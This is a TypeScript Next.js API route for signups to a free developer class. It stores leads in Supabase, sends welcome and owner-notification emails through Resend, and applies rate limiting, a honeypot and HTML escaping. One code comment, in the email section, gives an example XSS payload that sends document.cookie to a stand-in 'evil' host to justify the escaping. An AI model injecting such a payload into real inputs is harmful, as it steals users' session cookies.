import { HOUSE_LEAD_FROM } from "@/lib/lead-sender";

import { NextResponse } from "next/server";
import { createAdminClient } from "@/lib/supabase/admin";
import {
  isValidEmail,
  escapeHtml,
  isBotSubmission,
  sanitizeText,
} from "@/lib/validation";
import {
  rateLimit,
  getClientIp,
  rateLimitResponse,
} from "@/lib/rate-limit";
import { logEvent } from "@/lib/events";

/**
 * POST /api/interlinked-developer-signup
 *
 * Signup endpoint for the free Interlinked Developer Class landing at
 * /interlinked/developer/info. Collects name + email + phone, funnels
 * the lead onto the specialized Interlinked Developer track, and sends
 * a branded welcome + owner notification.
 *
 * Data model decision
 * -------------------
 * The `newsletter_subscriptions.subscription_tier` column has a CHECK
 * constraint that allows only 'subscribed' | 'premium' | 'unsubscribed'
 * (see supabase/migrations/015_create_missing_tables.sql). Adding a
 * 'developer' tier would require a schema migration, which CLAUDE.md
 * explicitly forbids autonomous agents from running.
 *
 * Instead we ship a two-write pattern that already has a precedent on
 * /api/landing-lead:
 *
 *   1. Upsert into `newsletter_subscriptions` with the default
 *      'subscribed' tier — this puts the lead on the general
 *      Interlinked newsletter (the general tier is correct; premium
 *      is a paid product and would be wrong for a free developer
 *      class signup).
 *
 *   2. Insert into `landing_page_leads` with
 *      slug = 'interlinked-developer-class'. This table captures
 *      name + phone + email and carries the `slug` discriminator
 *      that lets us segment "developer-class signups" later via:
 *
 *        SELECT email FROM landing_page_leads
 *        WHERE slug = 'interlinked-developer-class'
 *
 *      Which is exactly the query shape newsletter-sender uses for
 *      targeted-segment sends. When the dedicated "Interlinked
 *      Developer" newsletter send flow lands, the recipient list
 *      comes from this segment query — no migration, no separate
 *      table, no orphan data.
 *
 * This is the minimal-drift path that:
 *   - Respects the CHECK constraint (no migration)
 *   - Collects name + phone + email (per the user's "collect their
 *     info" brief)
 *   - Creates a typed segment ("developer-class") for targeted
 *     dedicated-newsletter sends (per "specialized Interlinked
 *     Developer newsletter")
 *   - Funnels the lead into the general Omni AI community/newsletter
 *     (per "bring them into the community")
 *
 * Emails
 * ------
 * Two Resend sends per successful POST:
 *   1. Registrant email — branded welcome with community CTA link
 *   2. Owner email — notification to alfred@omnileadsagi.com with full
 *      contact info so the owner can personally follow up (the
 *      owner notification is the only surface carrying the full
 *      name + phone + email triple; newsletter_subscriptions only
 *      persists the email)
 *
 * Rate limiting
 * -------------
 * 3 per 10 min per IP. Two-email-per-success means tighter than the
 * 5/min newsletter endpoint but more generous than webinar
 * registration (which is 2/10min because it sends .ics attachments
 * which are heavier). This endpoint doesn't send attachments, so
 * 3/10min matches /api/landing-lead which has the most comparable
 * send profile (insert + two emails).
 */

const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
const OWNER_EMAIL = "sitanim8@gmail.com";
const FROM_EMAIL = "Omni AI <bookings@omnios.news>";
const SITE_URL = "https://omnileadsagi.com";

// Segment slug for the landing_page_leads write. Keep this as a
// constant so any future newsletter-segment query or admin report can
// import it rather than string-matching a magic literal. If the slug
// value ever needs to change (unlikely — it's a stable segment ID),
// update both this file and any newsletter-sender segment query in
// the same commit.
const DEVELOPER_SEGMENT_SLUG = "interlinked-developer-class";

export async function POST(request: Request) {
  try {
    // Rate-limit FIRST. Two Resend emails per success means an attacker
    // that strips the honeypot and floods this endpoint would burn both
    // Resend quota and our branded-sender reputation faster than any
    // other public endpoint. 3/10min is plenty for a legit user (sign
    // up once, maybe retry on a typo).
    const ip = getClientIp(request.headers);
    const rl = rateLimit(
      `interlinked-developer-signup:${ip}`,
      3,
      10 * 60 * 1000,
    );
    if (!rl.ok) return rateLimitResponse(rl.resetMs);

    let body: Record<string, unknown>;
    try {
      body = (await request.json()) as Record<string, unknown>;
    } catch {
      return NextResponse.json(
        { error: "Invalid request body" },
        { status: 400 },
      );
    }

    // Honeypot — silent 200 so the bot doesn't retry with a different
    // field name. Matches the pattern on every other public POST.
    if (isBotSubmission(body)) {
      return NextResponse.json({ success: true });
    }

    const name = sanitizeText(body.name, 200);
    const phone = sanitizeText(body.phone, 50);
    const emailRaw = sanitizeText(body.email, 254);

    if (!name || !phone || !emailRaw) {
      return NextResponse.json(
        { error: "Please fill in every field." },
        { status: 400 },
      );
    }

    // Server-side email validation — blocks arbitrary-recipient abuse
    // of our branded sender via direct POST. See the same check on
    // /api/landing-lead and /api/webinar-registration.
    if (!isValidEmail(emailRaw)) {
      return NextResponse.json(
        { error: "Please enter a valid email address." },
        { status: 400 },
      );
    }
    const email = emailRaw.toLowerCase();

    const supabase = createAdminClient();

    // ── 1) Upsert into newsletter_subscriptions ──────────────────────
    //
    // Use 'subscribed' tier to respect the CHECK constraint on
    // subscription_tier. The developer-class segment lives in the
    // landing_page_leads table below — not in the subscription tier
    // (see file-level comment for the full rationale).
    //
    // onConflict: 'email' — idempotent; a repeat signup doesn't
    // duplicate the row, just refreshes subscribed=true. If the user
    // had previously unsubscribed, this re-activates them.
    const { error: subUpsertError } = await supabase
      .from("newsletter_subscriptions")
      .upsert(
        {
          email,
          first_name: name.split(" ")[0] || null,
          subscribed: true,
        },
        { onConflict: "email" },
      );

    if (subUpsertError) {
      // Log the full error server-side (RLS details, constraint names,
      // hints) but return a generic message so we don't leak DB
      // structure to the client. Matches the pattern on every other
      // public insert.
      console.error(
        "[interlinked-developer-signup] newsletter upsert error:",
        subUpsertError,
      );
      return NextResponse.json(
        {
          error:
            "We couldn't save your signup right now. Please try again in a moment.",
        },
        { status: 500 },
      );
    }

    // ── 2) Insert into landing_page_leads ────────────────────────────
    //
    // slug = DEVELOPER_SEGMENT_SLUG is the segmentation marker that
    // separates developer-class signups from other landing-page leads.
    // Future targeted newsletter sends pull the recipient list via:
    //   SELECT email FROM landing_page_leads WHERE slug = '…'
    // which is the same pattern newsletter-sender already uses for
    // segmented audiences. is_newsletter_subscriber: true because we
    // literally just subscribed them above — keeps the analytics view
    // on /admin honest.
    const { error: leadInsertError } = await supabase
      .from("landing_page_leads")
      .insert({
        slug: DEVELOPER_SEGMENT_SLUG,
        name,
        phone,
        email,
        is_newsletter_subscriber: true,
      });

    if (leadInsertError) {
      // The newsletter subscription above succeeded, so the user is
      // already on the general list — we don't want to unwind that on
      // a secondary-write failure. Log loudly and continue so the
      // welcome email still fires (critical for trust — user just
      // saw a success animation). The owner notification email below
      // doubles as the lead-capture backstop so Alfred still knows
      // the signup happened even if the landing_page_leads row
      // didn't land.
      console.error(
        "[interlinked-developer-signup] landing_page_leads insert error:",
        leadInsertError,
      );
    }

    // ── 3) Fire-and-forget event log ────────────────────────────────
    // Best-effort. The signup itself already succeeded; if the events
    // table is full / RLS changes / the logger throws, we don't want
    // to 500 the user. Wrapped in try/catch for the same reason the
    // newsletter endpoint wraps its log call.
    try {
      logEvent(supabase as any, {
        actor_type: "user",
        actor_id: email,
        event_type: "developer_class_signup",
        event_category: "crm",
        action: "create",
        target_type: "landing_page_lead",
        value_text: name,
        properties: {
          slug: DEVELOPER_SEGMENT_SLUG,
          email,
          phone,
        },
      });
    } catch {
      /* event log is best-effort */
    }

    // ── 4) Emails ───────────────────────────────────────────────────
    // Escape every user-controlled value before interpolating into the
    // HTML bodies. These templates use `${...}` interpolation directly;
    // without escapeHtml, a crafted name like
    //   <img src=x onerror="fetch('//evil/?c='+document.cookie)">
    // would render as live HTML in both our inbox and the registrant's.
    const nameEsc = escapeHtml(name);
    const firstNameEsc = escapeHtml(name.split(" ")[0] || name);
    const phoneEsc = escapeHtml(phone);
    const emailEsc = escapeHtml(email);

    if (RESEND_API_KEY) {
      const results = await Promise.allSettled([
        sendEmail({
          from: FROM_EMAIL,
          to: email,
          subject:
            "You're in — your free $50,000 Interlinked Developer Class",
          html: buildRegistrantEmail({ firstName: firstNameEsc }),
        }),
        sendEmail({
          from: HOUSE_LEAD_FROM,
          to: OWNER_EMAIL,
          replyTo: email,
          subject: `New Developer Class signup: ${name}`,
          html: buildOwnerEmail({
            name: nameEsc,
            email: emailEsc,
            phone: phoneEsc,
          }),
        }),
      ]);

      // Log any Resend failures server-side but don't 500 the user —
      // the DB writes already landed, the owner can follow up via the
      // landing_page_leads row. Matches the fail-soft email contract
      // on /api/landing-lead.
      results.forEach((r, i) => {
        if (r.status === "rejected") {
          console.error(
            `[interlinked-developer-signup] email ${i === 0 ? "registrant" : "owner"} failed:`,
            r.reason,
          );
        }
      });
    }

    return NextResponse.json({ success: true }, { status: 201 });
  } catch (err) {
    console.error("[interlinked-developer-signup] unexpected error:", err);
    return NextResponse.json(
      { error: "Something went wrong on our end. Please try again." },
      { status: 500 },
    );
  }
}

// ── Helpers ────────────────────────────────────────────────────────

async function sendEmail(params: {
  from: string;
  to: string;
  replyTo?: string;
  subject: string;
  html: string;
}) {
  const body: Record<string, unknown> = {
    from: params.from,
    to: [params.to],
    subject: params.subject,
    html: params.html,
  };
  if (params.replyTo) body.reply_to = params.replyTo;

  const res = await fetch("https://api.resend.com/emails", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${RESEND_API_KEY}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const errText = await res.text().catch(() => "<no body>");
    throw new Error(
      `Resend API error ${res.status}: ${errText.slice(0, 300)}`,
    );
  }
  return res.json();
}

// Registrant welcome — branded dark template matching the
// webinar-registration template byte-for-byte on colors and layout
// (purple OMNI AI badge, #111111 bg, 600px table) so the two emails
// feel like they come from the same brand. The developer-specific
// copy replaces the webinar session card.
function buildRegistrantEmail(p: { firstName: string }): string {
  return `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;padding:0;background:#111111;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
<div style="max-width:600px;margin:0 auto;padding:40px 20px;">

  <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:32px;">
    <tr>
      <td style="color:#a855f7;font-size:14px;font-weight:700;letter-spacing:0.5px;">OMNI AI</td>
      <td align="right" style="color:#fbbf24;font-size:12px;font-weight:600;letter-spacing:1px;">INTERLINKED · DEVELOPER</td>
    </tr>
  </table>

  <div style="margin-bottom:28px;">
    <h1 style="color:#ffffff;font-size:28px;font-weight:800;margin:0 0 10px;letter-spacing:-0.3px;">You're in, ${p.firstName}.</h1>
    <p style="color:#9ca3af;font-size:15px;line-height:1.65;margin:0;">
      Your seat in the Interlinked Developer Class is reserved — the full $50,000 curriculum, yours free. We'll drop the first module into your inbox today.
    </p>
  </div>

  <div style="background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:26px;margin-bottom:22px;">
    <p style="color:#fbbf24;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin:0 0 14px;">What happens next</p>
    <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;">
      <tr>
        <td style="padding:10px 0;border-bottom:1px solid #252525;color:#d1d5db;font-size:14px;line-height:1.6;">
          <strong style="color:#ffffff;">Today:</strong> Module 1 — LLM Foundations lands in your inbox.
        </td>
      </tr>
      <tr>
        <td style="padding:10px 0;border-bottom:1px solid #252525;color:#d1d5db;font-size:14px;line-height:1.6;">
          <strong style="color:#ffffff;">This week:</strong> You're subscribed to the specialized Interlinked Developer newsletter — new agent architectures, post-mortems, and code walkthroughs.
        </td>
      </tr>
      <tr>
        <td style="padding:10px 0;color:#d1d5db;font-size:14px;line-height:1.6;">
          <strong style="color:#ffffff;">Anytime:</strong> Join the Omni AI community and meet the operators actually shipping this stuff in production.
        </td>
      </tr>
    </table>
  </div>

  <div style="text-align:center;margin:36px 0 32px;">
    <a href="${SITE_URL}/join" style="display:inline-block;background:linear-gradient(135deg,#c084fc 0%,#a855f7 45%,#7c3aed 100%);color:#ffffff;font-weight:700;font-size:15px;padding:14px 34px;border-radius:12px;text-decoration:none;box-shadow:0 0 18px rgba(168,85,247,0.4);">
      Join the Community →
    </a>
  </div>

  <div style="background:#151515;border:1px solid #252525;border-radius:12px;padding:22px;margin-bottom:24px;">
    <p style="color:#fbbf24;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin:0 0 10px;">The five modules</p>
    <p style="color:#d1d5db;font-size:13px;line-height:1.75;margin:0;">
      1. LLM Foundations &middot; 2. Autonomous Agent Architecture &middot; 3. Multi-Agent Orchestration &middot; 4. Production Deployment &middot; 5. Revenue-Workflow Integration
    </p>
  </div>

  <div style="text-align:center;padding-top:20px;border-top:1px solid #222222;">
    <p style="color:#4b5563;font-size:11px;margin:0;">
      Omni AI &middot; Autonomous Intelligence &middot; <a href="${SITE_URL}" style="color:#6b7280;text-decoration:none;">omnileadsagi.com</a>
    </p>
  </div>
</div>
</body></html>`;
}

// Owner notification — same dark-brand template so Alfred's inbox
// renders the notification visually consistent with every other
// Omni AI system email. Contact card + segment tag so the lead is
// triageable at a glance. Reply-To is set to the lead's email in
// the fetch payload so hitting Reply in any mail client responds
// directly to the lead, not to bookings@.
function buildOwnerEmail(p: {
  name: string;
  email: string;
  phone: string;
}): string {
  return `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;padding:0;background:#111111;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
<div style="max-width:600px;margin:0 auto;padding:40px 20px;">

  <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:32px;">
    <tr>
      <td style="color:#a855f7;font-size:14px;font-weight:700;letter-spacing:0.5px;">OMNI AI</td>
      <td align="right" style="color:#22c55e;font-size:12px;font-weight:600;letter-spacing:1px;">NEW DEVELOPER SIGNUP</td>
    </tr>
  </table>

  <div style="margin-bottom:28px;">
    <h1 style="color:#ffffff;font-size:24px;font-weight:700;margin:0 0 6px;letter-spacing:-0.3px;">New Interlinked Developer signup</h1>
    <p style="color:#6b7280;font-size:13px;margin:0;">Someone just enrolled in the free $50K Developer Class.</p>
  </div>

  <div style="background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:24px;margin-bottom:16px;">
    <p style="color:#9ca3af;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1.5px;margin:0 0 16px;">Contact</p>
    <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;">
      <tr>
        <td style="color:#6b7280;font-size:13px;padding:8px 0;width:80px;vertical-align:top;">Name</td>
        <td style="color:#ffffff;font-size:14px;font-weight:600;padding:8px 0;">${p.name}</td>
      </tr>
      <tr>
        <td style="color:#6b7280;font-size:13px;padding:8px 0;vertical-align:top;">Email</td>
        <td style="padding:8px 0;"><a href="mailto:${p.email}" style="color:#60a5fa;font-size:14px;text-decoration:none;">${p.email}</a></td>
      </tr>
      <tr>
        <td style="color:#6b7280;font-size:13px;padding:8px 0;vertical-align:top;">Phone</td>
        <td style="padding:8px 0;"><a href="tel:${p.phone}" style="color:#d1d5db;font-size:14px;text-decoration:none;">${p.phone}</a></td>
      </tr>
    </table>
  </div>

  <div style="background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:24px;margin-bottom:28px;">
    <p style="color:#9ca3af;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1.5px;margin:0 0 14px;">Segment</p>
    <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;">
      <tr>
        <td style="color:#6b7280;font-size:13px;padding:8px 0;width:80px;vertical-align:top;">Source</td>
        <td style="color:#ffffff;font-size:14px;font-weight:600;padding:8px 0;">/interlinked/developer/info</td>
      </tr>
      <tr>
        <td style="color:#6b7280;font-size:13px;padding:8px 0;vertical-align:top;">Tag</td>
        <td style="padding:8px 0;"><code style="background:#0b0b0b;color:#fbbf24;font-size:12px;padding:3px 8px;border-radius:6px;font-family:ui-monospace,monospace;">${DEVELOPER_SEGMENT_SLUG}</code></td>
      </tr>
      <tr>
        <td style="color:#6b7280;font-size:13px;padding:8px 0;vertical-align:top;">Subscribed</td>
        <td style="color:#22c55e;font-size:14px;font-weight:600;padding:8px 0;">✓ Interlinked (general) + Developer segment</td>
      </tr>
    </table>
  </div>

  <div style="text-align:center;padding-top:20px;border-top:1px solid #222222;">
    <p style="color:#4b5563;font-size:11px;margin:0;">
      Omni AI &middot; <a href="${SITE_URL}" style="color:#6b7280;text-decoration:none;">omnileadsagi.com</a>
    </p>
  </div>
</div>
</body></html>`;
}
